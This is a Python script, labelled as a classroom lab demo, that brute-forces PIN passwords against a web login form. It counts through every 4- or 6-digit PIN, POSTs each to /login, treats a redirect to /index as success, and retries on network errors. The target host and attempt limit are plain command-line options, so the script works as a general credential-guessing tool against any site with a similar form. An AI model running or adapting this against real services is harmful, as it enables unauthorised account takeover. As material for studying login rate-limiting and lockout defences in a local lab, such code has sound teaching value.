import argparse
import http.client
import socket
import time
import urllib.parse


def _make_connection(host: str, port: int, timeout_s: float) -> http.client.HTTPConnection:
    return http.client.HTTPConnection(host, port, timeout=timeout_s)


def attempt_login(conn: http.client.HTTPConnection, username: str, password: str) -> bool:
    body = urllib.parse.urlencode({'username': username, 'password': password})
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'keep-alive',
    }
    conn.request('POST', '/login', body=body, headers=headers)
    resp = conn.getresponse()
    location = resp.getheader('Location', '')
    resp.read()
    return resp.status in (301, 302, 303, 307, 308) and location.startswith('/index')


def iter_pin4(start: int = 0):
    start = max(0, int(start))
    for i in range(start, 10000):
        yield f"{i:04d}"


def iter_pin6(start: int = 0):
    start = max(0, int(start))
    for i in range(start, 1000000):
        yield f"{i:06d}"


def main():
    parser = argparse.ArgumentParser(description='Online brute-force demo (for classroom local lab only).')
    parser.add_argument('--host', default='127.0.0.1')
    parser.add_argument('--port', default=5051, type=int)
    parser.add_argument('--username', required=True)
    parser.add_argument('--mode', choices=['pin4', 'pin6'], default='pin6')
    parser.add_argument('--max', type=int, default=500, help='Max attempts (default: 500)')
    parser.add_argument('--start', type=int, default=0, help='Start PIN as an integer (default: 0)')
    parser.add_argument('--sleep', type=float, default=0.0, help='Sleep between attempts (seconds)')
    parser.add_argument('--timeout', type=float, default=5.0, help='Per-request timeout (seconds)')
    parser.add_argument('--retries', type=int, default=3, help='Retries on transient network errors')
    parser.add_argument('--retry-sleep', type=float, default=0.05, help='Sleep between retries (seconds)')
    args = parser.parse_args()

    if args.mode == 'pin4':
        candidates = iter_pin4(args.start)
    elif args.mode == 'pin6':
        candidates = iter_pin6(args.start)
    else:
        raise SystemExit('unsupported mode')

    start = time.time()
    conn = _make_connection(args.host, args.port, args.timeout)
    for idx, pw in enumerate(candidates, start=1):
        if idx > args.max:
            break
        ok = False
        for attempt in range(args.retries + 1):
            try:
                ok = attempt_login(conn, args.username, pw)
                break
            except (http.client.RemoteDisconnected, ConnectionResetError, BrokenPipeError, socket.timeout, OSError) as e:
                # On macOS, too-fast short-lived connections can exhaust ephemeral ports (Errno 49: EADDRNOTAVAIL).
                # Recreate the connection and retry a few times instead of crashing mid-run.
                try:
                    conn.close()
                except Exception:
                    pass
                conn = _make_connection(args.host, args.port, args.timeout)

                if attempt >= args.retries:
                    raise
                errno = getattr(e, 'errno', None)
                if errno == 49:
                    time.sleep(max(args.retry_sleep, 0.01))
                else:
                    time.sleep(max(args.retry_sleep, 0.0))
        if ok:
            cost = time.time() - start
            print(f"[SUCCESS] username={args.username} password={pw} attempts={idx} time={cost:.2f}s")
            try:
                conn.close()
            except Exception:
                pass
            return 0
        if args.sleep > 0:
            time.sleep(args.sleep)
        if idx % 50 == 0:
            print(f"[progress] attempts={idx}")

    cost = time.time() - start
    try:
        conn.close()
    except Exception:
        pass
    print(f"[FAILED] no success within attempts={args.max} time={cost:.2f}s")
    return 1


if __name__ == '__main__':
    raise SystemExit(main())
